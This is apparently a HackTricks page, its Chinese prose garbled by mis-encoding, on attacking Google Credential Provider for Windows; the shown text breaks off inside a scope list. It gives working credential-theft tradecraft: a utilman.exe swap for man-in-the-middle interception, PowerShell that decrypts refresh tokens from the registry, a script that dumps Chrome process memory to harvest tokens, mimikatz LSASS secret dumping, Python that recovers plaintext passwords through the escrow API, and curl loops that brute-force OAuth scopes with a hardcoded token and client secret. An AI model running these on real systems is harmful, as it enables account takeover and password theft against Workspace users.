# GWS - Workspace Sync Attacks (GCPW, GCDS, Directory Sync with AD & EntraID)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## GCPW - Google Credential Provider for Windows

è¿™æ˜¯ Google Workspace æä¾›çš„å•ç‚¹ç™»å½•ï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨ **ä»–ä»¬çš„ Workspace å‡­æ®** ç™»å½• Windows PCã€‚æ­¤å¤–ï¼Œè¿™å°†ä¼šåœ¨ PC çš„æŸäº›åœ°æ–¹å­˜å‚¨è®¿é—® Google Workspace çš„ä»¤ç‰Œã€‚

{% hint style="success" %}
è¯·æ³¨æ„ [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) èƒ½å¤Ÿæ£€æµ‹ **GCPW**ï¼Œè·å–æœ‰å…³é…ç½®çš„ä¿¡æ¯ï¼Œç”šè‡³ **ä»¤ç‰Œ**ã€‚
{% endhint %}

### GCPW - MitM

å½“ç”¨æˆ·é€šè¿‡ GCPW è®¿é—®ä¸ Google Workspace åŒæ­¥çš„ Windows PC æ—¶ï¼Œéœ€è¦å®Œæˆä¸€ä¸ªå¸¸è§çš„ç™»å½•è¡¨å•ã€‚è¯¥ç™»å½•è¡¨å•å°†è¿”å›ä¸€ä¸ª OAuth ä»£ç ï¼ŒPC å°†ç”¨è¯¥ä»£ç äº¤æ¢åˆ·æ–°ä»¤ç‰Œï¼Œè¯·æ±‚å¦‚ä¸‹ï¼š

{% code overflow="wrap" %}
```http
POST /oauth2/v4/token HTTP/2
Host: www.googleapis.com
Content-Length: 311
Content-Type: application/x-www-form-urlencoded
[...headers...]

scope=https://www.google.com/accounts/OAuthLogin
&grant_type=authorization_code
&client_id=77185425430.apps.googleusercontent.com
&client_secret=OTJgUOQcT7lO7GsGZq2G4IlT
&code=4/0AVG7fiQ1NKncRzNrrGjY5S02wBWBJxV9kUNSKvB1EnJDCWyDmfZvelqKp0zx8jRGmR7LUw
&device_id=d5c82f70-71ff-48e8-94db-312e64c7354f
&device_type=chrome
```
{% endcode %}

æ–°è¡Œå·²æ·»åŠ ä»¥æé«˜å¯è¯»æ€§ã€‚

{% hint style="info" %}
å¯ä»¥é€šè¿‡åœ¨PCä¸Šå®‰è£…`Proxifier`ï¼Œç”¨`cmd.exe`è¦†ç›–`utilman.exe`äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶åœ¨Windowsç™»å½•é¡µé¢æ‰§è¡Œ**è¾…åŠ©åŠŸèƒ½**ï¼Œä»è€Œæ‰§è¡Œ**CMD**ï¼Œä»¥**å¯åŠ¨å’Œé…ç½®Proxifier**ï¼Œä»è€Œæ‰§è¡Œä¸­é—´äººæ”»å‡»ã€‚\
ä¸è¦å¿˜è®°åœ¨`Proxifier`ä¸­**é˜»æ­¢QUICK UDP**æµé‡ï¼Œä»¥ä¾¿é™çº§ä¸ºTCPé€šä¿¡ï¼Œè¿™æ ·ä½ å°±å¯ä»¥çœ‹åˆ°å®ƒã€‚

è¿˜è¦åœ¨â€œæœåŠ¡å’Œå…¶ä»–ç”¨æˆ·â€ä¸­é…ç½®ä¸¤ä¸ªé€‰é¡¹ï¼Œå¹¶åœ¨Windowsä¸­å®‰è£…Burp CAè¯ä¹¦ã€‚
{% endhint %}

æ­¤å¤–ï¼Œåœ¨**`HKLM:\SOFTWARE\Google\GCPW`**ä¸­æ·»åŠ é”®`enable_verbose_logging = 1`å’Œ`log_file_path = C:\Public\gcpw.log`å¯ä»¥ä½¿å…¶å­˜å‚¨ä¸€äº›æ—¥å¿—ã€‚

### GCPW - æŒ‡çº¹

å¯ä»¥é€šè¿‡æ£€æŸ¥ä»¥ä¸‹è¿›ç¨‹æ˜¯å¦å­˜åœ¨æˆ–ä»¥ä¸‹æ³¨å†Œè¡¨é”®æ˜¯å¦å­˜åœ¨æ¥æ£€æŸ¥è®¾å¤‡ä¸Šæ˜¯å¦å®‰è£…äº†GCPWï¼š
```powershell
# Check process gcpw_extension.exe
if (Get-Process -Name "gcpw_extension" -ErrorAction SilentlyContinue) {
Write-Output "The process gcpw_xtension.exe is running."
} else {
Write-Output "The process gcpw_xtension.exe is not running."
}

# Check if HKLM\SOFTWARE\Google\GCPW\Users exists
$gcpwHKLMPath = "HKLM:\SOFTWARE\Google\GCPW\Users"
if (Test-Path $gcpwHKLMPath) {
Write-Output "GCPW is installed: The key $gcpwHKLMPath exists."
} else {
Write-Output "GCPW is not installed: The key $gcpwHKLMPath does not exist."
}

# Check if HKCU\SOFTWARE\Google\Accounts exists
$gcpwHKCUPath = "HKCU:\SOFTWARE\Google\Accounts"
if (Test-Path $gcpwHKCUPath) {
Write-Output "Google Accounts are present: The key $gcpwHKCUPath exists."
} else {
Write-Output "No Google Accounts found: The key $gcpwHKCUPath does not exist."
}
```
åœ¨ **`HKCU:\SOFTWARE\Google\Accounts`** ä¸­ï¼Œå¯ä»¥è®¿é—®ç”¨æˆ·çš„ç”µå­é‚®ä»¶å’ŒåŠ å¯†çš„ **refresh token**ï¼Œå¦‚æœç”¨æˆ·æœ€è¿‘ç™»å½•è¿‡ã€‚

åœ¨ **`HKLM:\SOFTWARE\Google\GCPW\Users`** ä¸­ï¼Œå¯ä»¥åœ¨é”® `domains_allowed` ä¸­æ‰¾åˆ°å…è®¸ç™»å½•çš„ **domains**ï¼Œåœ¨å­é”®ä¸­å¯ä»¥æ‰¾åˆ°å…³äºç”¨æˆ·çš„ä¿¡æ¯ï¼Œå¦‚ç”µå­é‚®ä»¶ã€å¤´åƒã€ç”¨æˆ·åã€ä»¤ç‰Œç”Ÿå‘½å‘¨æœŸã€ä»¤ç‰Œå¥æŸ„...

{% hint style="info" %}
ä»¤ç‰Œå¥æŸ„æ˜¯ä¸€ä¸ªä»¥ `eth.` å¼€å¤´çš„ä»¤ç‰Œï¼Œå¯ä»¥é€šè¿‡è¯·æ±‚æå–ä¸€äº›ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'token_handle=eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg'
# Example response
{
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 12880152
}
```
{% endcode %}

è¿˜å¯ä»¥é€šè¿‡ä»¥ä¸‹è¯·æ±‚æ‰¾åˆ°è®¿é—®ä»¤ç‰Œçš„ä»¤ç‰Œå¥æŸ„ï¼š

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'access_token=<access token>'
# Example response
{
"issued_to": "77185425430.apps.googleusercontent.com",
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 1327,
"access_type": "offline",
"token_handle": "eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg"
}
```
{% endcode %}

æ®æˆ‘æ‰€çŸ¥ï¼Œä»ä»¤ç‰Œå¥æŸ„ä¸­è·å–åˆ·æ–°ä»¤ç‰Œæˆ–è®¿é—®ä»¤ç‰Œæ˜¯ä¸å¯èƒ½çš„ã€‚
{% endhint %}

æ­¤å¤–ï¼Œæ–‡ä»¶ **`C:\ProgramData\Google\Credential Provider\Policies\<sid>\PolicyFetchResponse`** æ˜¯ä¸€ä¸ªåŒ…å«ä¸åŒ **è®¾ç½®** ä¿¡æ¯çš„ jsonï¼Œå¦‚ `enableDmEnrollment`ã€`enableGcpAutoUpdate`ã€`enableMultiUserLogin`ï¼ˆå¦‚æœå¤šä¸ª Workspace ç”¨æˆ·å¯ä»¥ç™»å½•è®¡ç®—æœºï¼‰å’Œ `validityPeriodDays`ï¼ˆç”¨æˆ·æ— éœ€ç›´æ¥ä¸ Google é‡æ–°è®¤è¯çš„å¤©æ•°ï¼‰ã€‚

### GCPW - æ³¨å†Œè¡¨åˆ·æ–°ä»¤ç‰Œ

åœ¨æ³¨å†Œè¡¨ **`HKCU:\SOFTWARE\Google\Accounts`** ä¸­ï¼Œå¯èƒ½ä¼šæ‰¾åˆ°ä¸€äº›å¸¦æœ‰åŠ å¯†çš„ **`refresh_token`** çš„å¸æˆ·ã€‚æ–¹æ³• **`ProtectedData.Unprotect`** å¯ä»¥è½»æ¾è§£å¯†å®ƒã€‚

<details>

<summary>è·å– <strong><code>HKCU:\SOFTWARE\Google\Accounts</code></strong> æ•°æ®å¹¶è§£å¯† refresh_tokens</summary>
```powershell
# Import required namespace for decryption
Add-Type -AssemblyName System.Security

# Base registry path
$baseKey = "HKCU:\SOFTWARE\Google\Accounts"

# Function to search and decrypt refresh_token values
function Get-RegistryKeysAndDecryptTokens {
param (
[string]$keyPath
)

# Get all values within the current key
$registryKey = Get-Item -Path $keyPath
$foundToken = $false

# Loop through properties to find refresh_token
foreach ($property in $registryKey.Property) {
if ($property -eq "refresh_token") {
$foundToken = $true
try {
# Get the raw bytes of the refresh_token from the registry
$encryptedTokenBytes = (Get-ItemProperty -Path $keyPath -Name $property).$property

# Decrypt the bytes using ProtectedData.Unprotect
$decryptedTokenBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedTokenBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$decryptedToken = [System.Text.Encoding]::UTF8.GetString($decryptedTokenBytes)

Write-Output "Path: $keyPath"
Write-Output "Decrypted refresh_token: $decryptedToken"
Write-Output "-----------------------------"
}
catch {
Write-Output "Path: $keyPath"
Write-Output "Failed to decrypt refresh_token: $($_.Exception.Message)"
Write-Output "-----------------------------"
}
}
}

# Recursively process all subkeys
Get-ChildItem -Path $keyPath | ForEach-Object {
Get-RegistryKeysAndDecryptTokens -keyPath $_.PSPath
}
}

# Start the search from the base key
Get-RegistryKeysAndDecryptTokens -keyPath $baseKey
```
</details>

ç¤ºä¾‹è¾“å‡ºï¼š

{% code overflow="wrap" %}
```
Path: Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Google\Accounts\100402336966965820570Decrypted refresh_token: 1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI
```
{% endcode %}

å¦‚[**æ­¤è§†é¢‘**](https://www.youtube.com/watch?v=FEQxHRRP\_5I)æ‰€è¿°ï¼Œå¦‚æœåœ¨æ³¨å†Œè¡¨ä¸­æ‰¾ä¸åˆ°ä»¤ç‰Œï¼Œå¯ä»¥ä¿®æ”¹**`HKLM:\SOFTWARE\Google\GCPW\Users\<sid>\th`**ä¸­çš„å€¼ï¼ˆæˆ–åˆ é™¤ï¼‰ï¼Œä¸‹æ¬¡ç”¨æˆ·è®¿é—®è®¡ç®—æœºæ—¶ï¼Œä»–å°†éœ€è¦é‡æ–°ç™»å½•ï¼Œå¹¶ä¸”**ä»¤ç‰Œå°†å­˜å‚¨åœ¨ä¹‹å‰çš„æ³¨å†Œè¡¨ä¸­**ã€‚

### GCPW - ç£ç›˜åˆ·æ–°ä»¤ç‰Œ

æ–‡ä»¶**`%LocalAppData%\Google\Chrome\User Data\Local State`**å­˜å‚¨è§£å¯†**`refresh_tokens`**çš„å¯†é’¥ï¼Œè¿™äº›ä»¤ç‰Œä½äºç”¨æˆ·çš„**Google Chrome é…ç½®æ–‡ä»¶**ä¸­ï¼Œå¦‚ï¼š

* `%LocalAppData%\Google\Chrome\User Data\Default\Web Data`
* `%LocalAppData%\Google\Chrome\Profile*\Default\Web Data`

å¯ä»¥åœ¨[**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe)ä¸­æ‰¾åˆ°ä¸€äº›**C#ä»£ç **ï¼Œä»¥è§£å¯†çš„æ–¹å¼è®¿é—®è¿™äº›ä»¤ç‰Œã€‚

æ­¤å¤–ï¼Œå…³äºåŠ å¯†çš„å†…å®¹å¯ä»¥åœ¨æ­¤ä»£ç ä¸­æ‰¾åˆ°ï¼š[https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216)

å¯ä»¥è§‚å¯Ÿåˆ°ä½¿ç”¨äº†AESGCMï¼ŒåŠ å¯†ä»¤ç‰Œä»¥**ç‰ˆæœ¬**ï¼ˆæ­¤æ—¶ä¸º**`v10`**ï¼‰å¼€å¤´ï¼Œç„¶åæ˜¯[**12Bçš„nonce**](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L42)ï¼Œæ¥ç€æ˜¯**å¯†æ–‡**ï¼Œæœ€åæ˜¯**16Bçš„mac**ã€‚

### GCPW - ä»è¿›ç¨‹å†…å­˜ä¸­è½¬å‚¨ä»¤ç‰Œ

ä»¥ä¸‹è„šæœ¬å¯ç”¨äº**è½¬å‚¨**æ¯ä¸ª**Chrome**è¿›ç¨‹ï¼Œä½¿ç”¨`procdump`æå–**å­—ç¬¦ä¸²**ï¼Œç„¶å**æœç´¢**ä¸**è®¿é—®å’Œåˆ·æ–°ä»¤ç‰Œ**ç›¸å…³çš„å­—ç¬¦ä¸²ã€‚å¦‚æœChromeè¿æ¥åˆ°æŸä¸ªGoogleç½‘ç«™ï¼Œåˆ™æŸäº›**è¿›ç¨‹å°†ä¼šåœ¨å†…å­˜ä¸­å­˜å‚¨åˆ·æ–°å’Œ/æˆ–è®¿é—®ä»¤ç‰Œï¼**

<details>

<summary>è½¬å‚¨Chromeè¿›ç¨‹å¹¶æœç´¢ä»¤ç‰Œ</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

æˆ‘ç”¨ `gcpw_extension.exe` å°è¯•äº†åŒæ ·çš„æ“ä½œï¼Œä½†æ²¡æœ‰æ‰¾åˆ°ä»»ä½•ä»¤ç‰Œã€‚

å‡ºäºæŸç§åŸå› ï¼Œ**ä¸€äº›æå–çš„è®¿é—®ä»¤ç‰Œå°†æ— æ•ˆï¼ˆå°½ç®¡æœ‰äº›æ˜¯æœ‰æ•ˆçš„ï¼‰**ã€‚æˆ‘å°è¯•äº†ä»¥ä¸‹è„šæœ¬é€ä¸ªåˆ é™¤å­—ç¬¦ï¼Œä»¥å°è¯•ä»è½¬å‚¨ä¸­è·å–æœ‰æ•ˆä»¤ç‰Œã€‚å®ƒä»æœªå¸®åŠ©æˆ‘æ‰¾åˆ°æœ‰æ•ˆçš„ä»¤ç‰Œï¼Œä½†æˆ‘æƒ³å®ƒå¯èƒ½æœ‰ç”¨ï¼š

<details>

<summary>é€ä¸ªåˆ é™¤å­—ç¬¦æ£€æŸ¥è®¿é—®ä»¤ç‰Œ</summary>
```bash
#!/bin/bash

# Define the initial access token
access_token="ya29.a0AcM612wWX6Pe3Pc6ApZYknGs5n66W1Hr1CQvF_L_pIm3uZaXWisWFabzxheYCHErRn28l2UOJuAbMzfn1TUpSKqvYvlhXJpxQsKEtwhYXzN2BZdOQNji0EXfF7po1_0WaxhwqOiE0CFQciiL8uAmkRsoXhq9ekC_S8xLrODZ2yKdDR6gSFULWaiIG-bOCFx3DkbOdbjAk-U4aN1WbglUAJdLZh7DMzSucIIZwKWvBxqqajSAjrdW0mRNVN2IfkcVLPndwj7fQJV2bQaCgYKAbQSAQ4SFQHGX2MiPuU1D-9-YHVzaFlUo_RwXA0277"

# Define the URL for the request
url="https://www.googleapis.com/oauth2/v1/tokeninfo"

# Loop until the token is 20 characters or the response doesn't contain "error_description"
while [ ${#access_token} -gt 20 ]; do
# Make the request and capture the response
response=$(curl -s -H "Content-Type: application/x-www-form-urlencoded" -d "access_token=$access_token" $url)

# Check if the response contains "error_description"
if [[ ! "$response" =~ "error_description" ]]; then
echo "Success: Token is valid"
echo "Final token: $access_token"
echo "Response: $response"
exit 0
fi

# Remove the last character from the token
access_token=${access_token:0:-1}

echo "Token length: ${#access_token}"
done

echo "Error: Token invalid or too short"
```
</details>

### GCPW - æ¢å¤æ˜æ–‡å¯†ç 

è¦åˆ©ç”¨ GCPW æ¢å¤å¯†ç çš„æ˜æ–‡ï¼Œå¯ä»¥ä½¿ç”¨ **mimikatz** ä» **LSASS** ä¸­è½¬å‚¨åŠ å¯†å¯†ç ï¼š
```bash
mimikatz_trunk\x64\mimikatz.exe token::elevate lsadump::secrets exit
```
ç„¶åæœç´¢åƒ `Chrome-GCPW-<sid>` çš„ç§˜å¯†ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-6044191430395675441-x.jpg" alt=""><figcaption></figcaption></figure>

ç„¶åï¼Œä½¿ç”¨å…·æœ‰èŒƒå›´ `https://www.google.com/accounts/OAuthLogin` çš„ **è®¿é—®ä»¤ç‰Œ**ï¼Œå¯ä»¥è¯·æ±‚ç§é’¥ä»¥è§£å¯†å¯†ç ï¼š

<details>

<summary>è„šæœ¬ä»¥è·å–ç»™å®šè®¿é—®ä»¤ç‰Œã€åŠ å¯†å¯†ç å’Œèµ„æº ID çš„æ˜æ–‡å¯†ç </summary>
```python
import requests
from base64 import b64decode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

def get_decryption_key(access_token, resource_id):
try:
# Request to get the private key
response = requests.get(
f"https://devicepasswordescrowforwindows-pa.googleapis.com/v1/getprivatekey/{resource_id}",
headers={
"Authorization": f"Bearer {access_token}"
}
)

# Check if the response is successful
if response.status_code == 200:
private_key = response.json()["base64PrivateKey"]
# Properly format the RSA private key
private_key = f"-----BEGIN RSA PRIVATE KEY-----\n{private_key.strip()}\n-----END RSA PRIVATE KEY-----"
return private_key
else:
raise ValueError(f"Failed to retrieve private key: {response.text}")

except requests.RequestException as e:
print(f"Error occurred while requesting the private key: {e}")
return None

def decrypt_password(access_token, lsa_secret):
try:
# Obtain the private key using the resource_id
resource_id = lsa_secret["resource_id"]
encrypted_data = b64decode(lsa_secret["encrypted_password"])

private_key_pem = get_decryption_key(access_token, resource_id)
print("Found private key:")
print(private_key_pem)

if private_key_pem is None:
raise ValueError("Unable to retrieve the private key.")

# Load the RSA private key
rsa_key = RSA.import_key(private_key_pem)
key_size = int(rsa_key.size_in_bits() / 8)

# Decrypt the encrypted data
cipher_rsa = PKCS1_OAEP.new(rsa_key)
session_key = cipher_rsa.decrypt(encrypted_data[:key_size])

# Extract the session key and other data from decrypted payload
session_header = session_key[:32]
session_nonce = session_key[32:]
mac = encrypted_data[-16:]

# Decrypt the AES GCM data
aes_cipher = AES.new(session_header, AES.MODE_GCM, nonce=session_nonce)
decrypted_password = aes_cipher.decrypt_and_verify(encrypted_data[key_size:-16], mac)

print("Decrypted Password:", decrypted_password.decode("utf-8"))

except Exception as e:
print(f"Error occurred during decryption: {e}")

# CHANGE THIS INPUT DATA!
access_token = "<acces_token>"
lsa_secret = {
"encrypted_password": "<encrypted-password>",
"resource_id": "<resource-id>"
}

decrypt_password(access_token, lsa_secret)
```
</details>

åœ¨Chromiumæºä»£ç ä¸­å¯ä»¥æ‰¾åˆ°å…¶å…³é”®ç»„ä»¶ï¼š

* APIåŸŸï¼š [https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code](https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code)
* APIç«¯ç‚¹ï¼š [https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70](https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70)

### GCPW - ä»åˆ·æ–°ä»¤ç‰Œç”Ÿæˆè®¿é—®ä»¤ç‰Œ

ä½¿ç”¨åˆ·æ–°ä»¤ç‰Œï¼Œå¯ä»¥ä½¿ç”¨å®ƒä»¥åŠä»¥ä¸‹å‘½ä»¤ä¸­æŒ‡å®šçš„å®¢æˆ·ç«¯IDå’Œå®¢æˆ·ç«¯å¯†é’¥ç”Ÿæˆè®¿é—®ä»¤ç‰Œï¼š
```bash
curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCPW - Scopes

{% hint style="info" %}
è¯·æ³¨æ„ï¼Œå³ä½¿æ‹¥æœ‰åˆ·æ–°ä»¤ç‰Œï¼Œä¹Ÿæ— æ³•è¯·æ±‚è®¿é—®ä»¤ç‰Œçš„ä»»ä½•èŒƒå›´ï¼Œå› ä¸ºæ‚¨åªèƒ½è¯·æ±‚**ç”±æ‚¨ç”Ÿæˆè®¿é—®ä»¤ç‰Œçš„åº”ç”¨ç¨‹åºæ”¯æŒçš„èŒƒå›´**ã€‚

æ­¤å¤–ï¼Œåˆ·æ–°ä»¤ç‰Œåœ¨æ¯ä¸ªåº”ç”¨ç¨‹åºä¸­éƒ½ä¸æ˜¯æœ‰æ•ˆçš„ã€‚
{% endhint %}

é»˜è®¤æƒ…å†µä¸‹ï¼ŒGCPWä¸ä¼šä»¥ç”¨æˆ·èº«ä»½è®¿é—®æ‰€æœ‰å¯èƒ½çš„OAuthèŒƒå›´ï¼Œå› æ­¤ä½¿ç”¨ä»¥ä¸‹è„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å¯ä»¥ä¸`refresh_token`ä¸€èµ·ä½¿ç”¨ä»¥ç”Ÿæˆ`access_token`çš„èŒƒå›´ï¼š

<details>

<summary>ç”¨äºæš´åŠ›ç ´è§£èŒƒå›´çš„Bashè„šæœ¬</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

è¿™æ˜¯æˆ‘åœ¨å†™ä½œæ—¶å¾—åˆ°çš„è¾“å‡ºï¼š
```
Valid scopes:
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
```
æ­¤å¤–ï¼Œé€šè¿‡æ£€æŸ¥Chromiumæºä»£ç ï¼Œå¯ä»¥[**æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶**](https://github.com/chromium/chromium/blob/5301790cd7ef97088d4862465822da4cb2d95591/google\_apis/gaia/gaia\_constants.cc#L24)ï¼Œå…¶ä¸­åŒ…å«**å…¶ä»–èŒƒå›´**ï¼Œå¯ä»¥å‡è®¾**åœ¨ä¹‹å‰æš´åŠ›ç ´è§£çš„åˆ—è¡¨ä¸­æ²¡æœ‰å‡ºç°**ã€‚å› æ­¤ï¼Œå¯ä»¥å‡è®¾è¿™äº›é¢å¤–çš„èŒƒå›´ï¼š

<details>

<summary>é¢å¤–èŒƒå›´</summary>
```
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/aidahttps://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
